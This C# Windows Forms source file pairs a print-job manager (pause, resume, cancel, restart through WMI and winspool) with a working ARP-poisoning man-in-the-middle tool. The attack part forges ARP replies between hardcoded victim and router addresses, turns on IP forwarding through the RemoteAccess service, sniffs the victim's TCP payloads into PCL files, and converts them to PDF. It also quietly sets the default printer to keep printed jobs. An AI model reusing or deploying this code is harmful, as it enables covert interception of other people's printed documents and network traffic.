using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections;
using System.Collections.Specialized;
using System.Management;
using SharpPcap;
using PacketDotNet;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.ServiceProcess;
using System.IO;

namespace printer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            // device list init
            CaptureDeviceList devices = CaptureDeviceList.Instance;
            foreach (ICaptureDevice objeto in devices)
            {
                comboBox1.Items.Add(objeto.Description);
            }
            comboBox1.SelectedIndex = 0;

            //
            this.listView1.View = System.Windows.Forms.View.Details;
            operatePrinterJobs();
        }

        static String DefaultPrinterName;

        //SET JOB const
        public const int JOB_CONTROL_PAUSE = 0x01;
        public const int JOB_CONTROL_RESUME = 0x02;
        public const int JOB_CONTROL_RESTART = 0x04;
        public const int JOB_CONTROL_CANCEL = 0x03;
        public const int JOB_CONTROL_DELETE = 0x05;
        public const int JOB_CONTROL_RETAIN = 0x08;
        public const int JOB_CONTROL_RELEASE = 0x09;


        // import WIN32 API to use SetJob function 
        [DllImport("winspool.drv", CharSet = CharSet.Auto)]
        public static extern bool OpenPrinter(string pPrinterName, out IntPtr phPrinter, IntPtr pDefault);

        [DllImport("winspool.drv", CharSet = CharSet.Auto)]
        public static extern bool ClosePrinter(IntPtr hPrinter);

        [DllImport("winspool.drv", EntryPoint = "SetJobA")]
        static extern int SetJobA(IntPtr hPrinter, int JobId, int Level, ref byte pJob, int Command_Renamed);// SetJob status，to restart printed Job which is not supported in WMI.  Spooler API



        public static StringCollection GetPrintersCollection()//get a list of printer
        {
            StringCollection printerNameCollection = new StringCollection();
            string searchQuery = "SELECT * FROM Win32_Printer";
            ManagementObjectSearcher searchPrinters = new ManagementObjectSearcher(searchQuery);  //exec WQL
            ManagementObjectCollection printerCollection = searchPrinters.Get();  // get a set of object of managementobject

            foreach (ManagementObject printer in printerCollection)
            {
                if ((bool)printer.GetPropertyValue("default") == true)  //judge if the current print is the default printer 
                {
                    if (!(bool)printer.GetPropertyValue("KeepPrintedJobs"))
                    {
                        printer.SetPropertyValue("KeepPrintedJobs", true);//set the "keep jobs" property of the default printer 
                        try
                        {
                            printer.Put();           //commit the change of configuration 
                        }
                        catch (Exception)//if uac control opened
                        {
                            MessageBox.Show("更改默认打印机设置拒绝访问");
                        }
                    }
                    DefaultPrinterName = printer.Properties["Name"].Value.ToString();

                }
                printerNameCollection.Add(printer.Properties["Name"].Value.ToString());  //add to the string set

            }
            return printerNameCollection;

        }
        public static StringCollection GetPrintJobsCollection(string printerName)//get print job list of printers
        {
            StringCollection printJobCollection = new StringCollection();
            string searchQuery = "SELECT * FROM Win32_PrintJob";

            /*searchQuery can also be mentioned with where Attribute,
                but this is not working in Windows 2000 / ME / 98 machines 
                and throws Invalid query error*/
            ManagementObjectSearcher searchPrintJobs =
                      new ManagementObjectSearcher(searchQuery);
            ManagementObjectCollection prntJobCollection = searchPrintJobs.Get();
            foreach (ManagementObject prntJob in prntJobCollection)
            {
                System.String jobName = prntJob.Properties["Name"].Value.ToString();

                //Job name's format [Printer name], [Job ID]
                char[] splitArr = new char[1];
                splitArr[0] = Convert.ToChar(",");
                string prnterName = jobName.Split(splitArr)[0];
                string documentName = prntJob.Properties["Document"].Value.ToString();
                string jobid = prntJob.Properties["JobId"].Value.ToString();
                string status = prntJob.Properties["Status"].Value.ToString();
                if (String.Compare(prnterName, printerName, true) == 0)
                {
                    printJobCollection.Add(status+"<"+jobid + ": " + documentName);  // add jobID
                }
            }
            return printJobCollection;
        }

        /// <summary>
        /// 暂停指定打印任务
        /// </summary>
        /// <param name="printerName">打印机名称</param>
        /// <param name="printJobID">打印任务ID</param>
        /// <returns></returns>
        public static bool PausePrintJob(string printerName, int printJobID)//pause the specific job
        {
            bool isActionPerformed = false;
            string searchQuery = "SELECT * FROM Win32_PrintJob";
            ManagementObjectSearcher searchPrintJobs =
                     new ManagementObjectSearcher(searchQuery);
            ManagementObjectCollection prntJobCollection = searchPrintJobs.Get();
            foreach (ManagementObject prntJob in prntJobCollection)
            {
                System.String jobName = prntJob.Properties["Name"].Value.ToString();

                //Job name would be of the format [Printer name], [Job ID]
                char[] splitArr = new char[1];
                splitArr[0] = Convert.ToChar(",");
                string prnterName = jobName.Split(splitArr)[0];
                int prntJobID = Convert.ToInt32(jobName.Split(splitArr)[1]);
                string documentName = prntJob.Properties["Document"].Value.ToString();
                if (String.Compare(prnterName, printerName, true) == 0)
                {
                    if (prntJobID == printJobID)
                    {
                        prntJob.InvokeMethod("Pause", null);
                        isActionPerformed = true;
                        break;
                    }
                }
            }
            return isActionPerformed;
        }
        //public static bool ResumePrintJob(string printerName, int printJobID)
        /// <summary>
        /// 继续所有打印任务
        /// </summary>
        /// <param name="printerName">打印机名称</param>
        /// <param name="printJobID">打印任务ID</param>
        /// <returns></returns>
        public static bool ResumePrintJob(string printerName, int printJobID)//resume the paused job
        {
            bool isActionPerformed = false;
            string searchQuery = "SELECT * FROM Win32_PrintJob";
            ManagementObjectSearcher searchPrintJobs =
                     new ManagementObjectSearcher(searchQuery);
            ManagementObjectCollection prntJobCollection = searchPrintJobs.Get();
            foreach (ManagementObject prntJob in prntJobCollection)
            {
                System.String jobName = prntJob.Properties["Name"].Value.ToString();

                System.String JobID = prntJob.Properties["JobID"].Value.ToString();

                System.String JobSize = prntJob.Properties["Size"].Value.ToString();

                System.String JobPages = prntJob.Properties["TotalPages"].Value.ToString();

                System.String JobOwner = prntJob.Properties["Owner"].Value.ToString();

                System.String JobName = prntJob.Properties["Document"].Value.ToString();

                //Job name would be of the format [Printer name], [Job ID]
                char[] splitArr = new char[1];
                splitArr[0] = Convert.ToChar(",");
                string prnterName = jobName.Split(splitArr)[0];

                int prntJobID = Convert.ToInt32(jobName.Split(splitArr)[1]);
                string documentName = prntJob.Properties["Document"].Value.ToString();
                if (String.Compare(prnterName, printerName, true) == 0)
                {
                    if (prntJobID == printJobID)
                    if (prntJob.Properties["Status"].Value.ToString().Equals("Degraded"))
                    {
                        prntJob.InvokeMethod("Resume", null);
                        isActionPerformed = true;
                        break;
                    }
                }
            }
            return isActionPerformed;
        }
        /// <summary>
        /// 取消指定任务
        /// </summary>
        /// <param name="printerName">打印机名称</param>
        /// <param name="printJobID">打印任务ID</param>
        /// <returns></returns>
        public static bool CancelPrintJob(string printerName, int printJobID)// cancel the specific job
        {
            bool isActionPerformed = false;
            string searchQuery = "SELECT * FROM Win32_PrintJob";
            ManagementObjectSearcher searchPrintJobs =
                   new ManagementObjectSearcher(searchQuery);
            ManagementObjectCollection prntJobCollection = searchPrintJobs.Get();
            foreach (ManagementObject prntJob in prntJobCollection)
            {
                System.String jobName = prntJob.Properties["Name"].Value.ToString();
                //Job name would be of the format [Printer name], [Job ID]
                char[] splitArr = new char[1];
                splitArr[0] = Convert.ToChar(",");
                string prnterName = jobName.Split(splitArr)[0];
                int prntJobID = Convert.ToInt32(jobName.Split(splitArr)[1]);
                string documentName = prntJob.Properties["Document"].Value.ToString();
                if (String.Compare(prnterName, printerName, true) == 0)
                {
                    if (prntJobID == printJobID)
                    {
                        //performs a action similar to the cancel 
                        //operation of windows print console
                        prntJob.Delete();
                        isActionPerformed = true;
                        break;
                    }
                }
            }
            return isActionPerformed;
        }
        // public static bool RestartPrintedJob() {
        /// <summary>
        /// 重启指定打印任务
        /// </summary>
        /// <param name="printer">打印机名称</param>
        /// <param name="printJobID">打印任务ID</param>
        public static void RestartPrinterJobs(string printer, int printJobID)//restart the specific job
        {
            IntPtr handle;

            // open printer 
            OpenPrinter(printer, out handle, IntPtr.Zero);

            byte b = 0;
            SetJobA(handle, printJobID, 0, ref b, JOB_CONTROL_RESTART);

            // close printer 
            ClosePrinter(handle);


        }



        public void PrintValues3(StringCollection myCol,string printern)
        {
            for (int i = 0; i < myCol.Count; i++)
            //Console.WriteLine("   {0}", myCol[i]);
            {
                this.listView1.Items.Add(printern);
                this.listView1.Items[i].SubItems.Add(myCol[i].Split('<')[1]);
                this.listView1.Items[i].SubItems.Add(myCol[i].Split('<')[0]);
            }
           
        }



        public  void operatePrinterJobs() //output the jobs of printers
        {
            StringCollection printerNameCollection;
            StringCollection printJobCollection;

            printerNameCollection = GetPrintersCollection();

          //  Console.WriteLine("Displays the elements:");
          //  PrintValues3(printerNameCollection);

            for (int i = 0; i < printerNameCollection.Count; i++)
            {
                printJobCollection = GetPrintJobsCollection(printerNameCollection[i]);
                PrintValues3(printJobCollection, printerNameCollection[i]);                
            }

            //  ResumePrintJob(DefaultPrinterName); //继续所有任务
            //  CancelPrintJob(DefaultPrinterName,12);//取消指定任务
            //   PausePrintJob(DefaultPrinterName, 12);// 暂定指定任务
            //  RestartPrinterJobs(DefaultPrinterName,12);//重启指定任务

        }


        //IP route
        static bool isServiceStarted = false;
        static public void operateIPRouteService()
        {
            if (!isServiceStarted)
            {
                EnableTheService("RemoteAccess");
                StartService("RemoteAccess");
                isServiceStarted = true;
            }
            else
            {
                StopService("RemoteAccess");
                DisableTheService("RemoteAccess");
                isServiceStarted = false;
            }
        }
        public static void StartService(string serviceName)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running,
                                                    new TimeSpan(0, 0, 0, 20));
            }
            catch (Exception ex)
            {
                MessageBox.Show("IP route started failed");
            }
        }
        public static void StopService(string serviceName)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped,
                                                    new TimeSpan(0, 0, 0, 20));
            }
            catch (Exception ex)
            {
                MessageBox.Show("IP route stopped failed");
            }
        }
        public static void EnableTheService(string serviceName)
        {
            using (var mo = new ManagementObject(string.Format("Win32_Service.Name=\"{0}\"", serviceName)))
            {
                mo.InvokeMethod("ChangeStartMode", new object[] { "Automatic" });
            }
        }
        public static void DisableTheService(string serviceName)
        {
            using (var mo = new ManagementObject(string.Format("Win32_Service.Name=\"{0}\"", serviceName)))
            {
                mo.InvokeMethod("ChangeStartMode", new object[] { "Disabled" });
            }
        }

        //Send packet
        public static void SendARPresponse(ICaptureDevice device, IPAddress srcIP, IPAddress dstIP, PhysicalAddress srcMac, PhysicalAddress dstMac)
        {
            ARPPacket arp = new ARPPacket(ARPOperation.Response, dstMac, dstIP, srcMac, srcIP);
            EthernetPacket eth = new EthernetPacket(srcMac, dstMac, EthernetPacketType.Arp);
            arp.PayloadData = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            eth.PayloadPacket = arp;
            device.SendPacket(eth);
        }
        //ARP POISON
        //static bool isPoisoning = false;
        static bool breake = false;
        static ICaptureDevice device = null;
        public  ICaptureDevice enableARPPoison(int deviceID, string srcIP, string srcMAC, string dstIP, string dstMAC, string midIP, string midMAC)
        {

            if ((srcMAC.Length != 12 || dstMAC.Length != 12 || midMAC.Length != 12))
            {
                return null;
            }
            if (deviceID == 0)
            {
                return null;
            }

            int mss = 1000;

            CaptureDeviceList devices = CaptureDeviceList.Instance;
            device = devices[deviceID - 1];

            // Register our handler function to the
            // 'packet arrival' event
            device.OnPacketArrival +=
                new SharpPcap.PacketArrivalEventHandler(device_OnPacketArrival);


            device.Open(DeviceMode.Promiscuous, 1000);
            breake = true;
            string t1 = dstIP;
            string t2 = srcIP;
            string t3 = midIP;
            string t4 = midMAC.ToUpper();
            string t5 = dstMAC.ToUpper();
            string t6 = srcMAC.ToUpper();

            Thread arpenv = new Thread(() =>
            {
                while (breake)
                {
                    SendARPresponse(device, IPAddress.Parse(t1), IPAddress.Parse(t2), PhysicalAddress.Parse(t4), PhysicalAddress.Parse(t6));
                    SendARPresponse(device, IPAddress.Parse(t2), IPAddress.Parse(t1), PhysicalAddress.Parse(t4), PhysicalAddress.Parse(t5));
                    SendARPresponse(device, IPAddress.Parse(t1), IPAddress.Parse(t3), PhysicalAddress.Parse(t5), PhysicalAddress.Parse(t4));//FIX MAC INTERNA DEL ROUTER
                    SendARPresponse(device, IPAddress.Parse(t2), IPAddress.Parse(t3), PhysicalAddress.Parse(t6), PhysicalAddress.Parse(t4));//FIX MAC INTERNA DE LA VICTIMA
                    Thread.Sleep(mss);
                }
                Thread.CurrentThread.Abort();
            });
            arpenv.IsBackground = true;
            arpenv.Start();
            return device;
        }
        static bool isFin = false;
        static string fileName = "pcl";
        static StringCollection fileNameSet = new StringCollection();
        static long sequenceNum = -1;
        public  void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            var time = e.Packet.Timeval.Date;
            var len = e.Packet.Data.Length;

            var packet = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);

            var tcpPacket = (PacketDotNet.TcpPacket)packet.Extract(typeof(PacketDotNet.TcpPacket));

            FileStream fs;

            if (tcpPacket != null)
            {
                var ipPacket = (PacketDotNet.IpPacket)tcpPacket.ParentPacket;
                System.Net.IPAddress srcIpP = ipPacket.SourceAddress;
                System.Net.IPAddress dstIpP = ipPacket.DestinationAddress;

                if (srcIpP.Equals(IPAddress.Parse(srcIP)))
                {//&&tcpPacket.DestinationPort==9100) {
                    if (isFin)
                    {
                        fileName = "pcl" + tcpPacket.AcknowledgmentNumber;
                        fileNameSet.Add(fileName);
                        isFin = false;
                    }
                    if (tcpPacket.Fin)
                    {
                        isFin = true;

                    }

                    if ((sequenceNum == -1 && tcpPacket.PayloadData.Length == 0) || (sequenceNum != -1 && tcpPacket.PayloadData.Length == 0))
                    {
                        // do nothing
                    }
                    else if (tcpPacket.PayloadData.Length > 0)
                    {
                        if (File.Exists(fileName))
                        {
                            fs = new FileStream(fileName, FileMode.Append);
                        }
                        else
                        {
                            fs = new FileStream(fileName, FileMode.Create);
                        }
                        BinaryWriter bw = new BinaryWriter(fs);

                        if (sequenceNum == -1 && tcpPacket.PayloadData.Length > 0)
                        {
                            sequenceNum = tcpPacket.SequenceNumber;
                            sequenceNum += tcpPacket.PayloadData.Length;
                            bw.Write(tcpPacket.PayloadData);
                            label8.Text = "Status: Has Captured Files, Continuing ..";
                        }
                        else if (sequenceNum != -1 && tcpPacket.PayloadData.Length > 0)
                        {
                            if (sequenceNum == tcpPacket.SequenceNumber)
                            {
                                sequenceNum += tcpPacket.PayloadData.Length;
                                bw.Write(tcpPacket.PayloadData);
                            }
                        }
                        bw.Flush();

                        bw.Close();
                        fs.Close();
                    }




                }

                //  if (srcIp.Equals(IPAddress.Parse("192.168.37.130")) && dstIp.Equals(IPAddress.Parse("192.168.37.1"))) {
                //      device.SendPacket(ipPacket);
                //      Console.WriteLine("has send");
                //  }


                int srcPort = tcpPacket.SourcePort;
                int dstPort = tcpPacket.DestinationPort;

               // Console.WriteLine("{0}:{1}:{2},{3} Len={4} {5}:{6} -> {7}:{8}", time.Hour, time.Minute, time.Second, time.Millisecond, len, srcIpP, srcPort, dstIpP, dstPort);
            }

        }
        //device capture
        public static void capture()
        {

            string filter = "tcp and ip";
            device.Filter = filter;

            //Console.WriteLine("-- Listening on {0}, hit 'Enter' to stop...", device.Description);

            // Start the capturing process
            device.StartCapture();



        }

        /*     static string srcIP = "192.168.37.130",
                            srcMAC = "000C29328D3F",
                             dstIP = "192.168.37.1",
                            dstMAC = "005056C00008",
                            midIP = "192.168.37.132",
                            midMAC = "000C29B3FE24";
         */
        static string srcIP = "192.168.1.225",
               srcMAC = "303A64AD6281",
                dstIP = "192.168.1.2",
               dstMAC = "0014385D7FD6",
               midIP = "192.168.1.195",
               midMAC = "28E347C768D1";
        void mmain(string[] args)
        {
            bool loop = true;
            int deviceID = 0;

            ServiceController service = new ServiceController("RemoteAccess");
            if (service.ServiceName == "RemoteAccess")
            {
                if (service.Status.ToString() != "Running")
                {
                    isServiceStarted = false;
                }
                else
                {
                    isServiceStarted = true;
                }
            }

            while (loop)
            {
                Console.WriteLine("1.print.\n2.list\n3.arp\n4.capture\n5.finish");
                int choice = int.Parse(Console.ReadLine());
                switch (choice)
                {
                    case 1: // operatePrinterJobs();
                        break;
                    case 2: break;
                    case 3:
                                               
                        operateIPRouteService();    //start ip route to farword packets
                        enableARPPoison(deviceID, srcIP, srcMAC, dstIP, dstMAC, midIP, midMAC);
                        break;
                    case 4:
                        if (breake)
                        {
                            capture(); break;
                        }
                        else
                        {
                            Console.WriteLine("ARP poison is not started.");
                            break;
                        }
                    case 5:
                        isServiceStarted = true;
                        operateIPRouteService();
                        breake = false;
                        device.Close();
                        loop = false;
                        break;

                    default:
                        isServiceStarted = true;
                        operateIPRouteService();
                        breake = false;
                        device.Close();
                        loop = false;
                        break;
                }
            }

            //wmi

            //arp

            //capture

            //process
        }

        private void button1_Click(object sender, EventArgs e)  //forward
        {
            operateIPRouteService();
            if (isServiceStarted)            
                button1.Text = "Disable Forward";            
            else
                button1.Text = "Enable Forward";
            
        }

        private void button2_Click(object sender, EventArgs e) //arp
        {
            if (srcipp.Text.Equals("") || dstipp.Text.Equals("") || toipp.Text.Equals("") || srcmacc.Text.Length != 12 || dstmacc.Text.Length != 12 || tomacc.Text.Length != 12)
                MessageBox.Show("Not valid input IP or MAC address.");
            else if (!breake)
            {
                enableARPPoison(comboBox1.SelectedIndex + 1, srcipp.Text, srcmacc.Text, dstipp.Text, dstmacc.Text, toipp.Text, tomacc.Text);
                button2.Text = "Disable ARP";
            }
            else
            {
                breake = false;
                button2.Text = "Ennable ARP";
            }
        }

        private void button3_Click(object sender, EventArgs e) //capture
        {
            if (breake)
            {
                if (button3.Text == "Start Capture")
                {
                    capture();
                    label8.Text = "Status: Capturing";
                    button3.Text = "Stop Capture";
                }
                else
                {
                    // Stop the capturing process
                    device.StopCapture();
                    button3.Text = "Start Capture";
                    label8.Text = "Status: Waiting ..";
                    device.Close();
                }
            }
            else
            {              
                MessageBox.Show("ARP poison is not started.");              
            }
        }

        [DllImport(@"pcltoolsdk.dll", CharSet = CharSet.Auto)]
        static extern uint VeryPDFPCLConverter([MarshalAs(UnmanagedType.LPStr)] string strCmdLine);
        private void button9_Click(object sender, EventArgs e) //parse
        {
            string path;
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.InitialDirectory = System.Environment.CurrentDirectory;
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                path = dialog.FileName;
            
                string strCmd;
                strCmd = "-$ XXXXXXXXXXXXX \"" + dialog.FileName + "\" \"" + System.Environment.CurrentDirectory + "\\" + Path.GetFileName(path) + ".pdf" + "\"";
                uint nRet = VeryPDFPCLConverter(strCmd);
                System.Diagnostics.Process.Start(System.Environment.CurrentDirectory + "\\" + Path.GetFileName(path) + ".pdf");
            }
        }

        private void button4_Click(object sender, EventArgs e) //refresh
        {
            listView1.Items.Clear();
            operatePrinterJobs();
        }

        private void button5_Click(object sender, EventArgs e) //cancel
        {
            if (listView1.FocusedItem == null)
            {
                MessageBox.Show("No item was slected");
            }
            else
            {
                CancelPrintJob(listView1.FocusedItem.SubItems[0].Text, int.Parse(listView1.FocusedItem.SubItems[1].Text.Split(':')[0]));
                MessageBox.Show("operate successfully");
                listView1.Items.Clear();
                operatePrinterJobs();
            }
        }

        private void button6_Click(object sender, EventArgs e) 
        {
            if (listView1.FocusedItem == null)
            {
                MessageBox.Show("No item was slected");
            }
            else { 
            RestartPrinterJobs(listView1.FocusedItem.SubItems[0].Text, int.Parse(listView1.FocusedItem.SubItems[1].Text.Split(':')[0]));            
            MessageBox.Show("operate successfully");
            listView1.Items.Clear();
            operatePrinterJobs();
            }
        }
        private void button7_Click(object sender, EventArgs e)
        {    if (listView1.FocusedItem == null)
            {
                MessageBox.Show("No item was slected");
            }
            else { 
             
                PausePrintJob(listView1.FocusedItem.SubItems[0].Text, int.Parse(listView1.FocusedItem.SubItems[1].Text.Split(':')[0]));
                MessageBox.Show("operate successfully");
                listView1.Items.Clear();
                operatePrinterJobs();
            }
        }
        private void button8_Click(object sender, EventArgs e)
        {
        if (listView1.FocusedItem == null)
            {
                MessageBox.Show("No item was slected");
            }
            else {
                ResumePrintJob(listView1.FocusedItem.SubItems[0].Text, int.Parse(listView1.FocusedItem.SubItems[1].Text.Split(':')[0]));
                MessageBox.Show("operate successfully");
                listView1.Items.Clear();
                operatePrinterJobs();
            }
        }
        
    }
}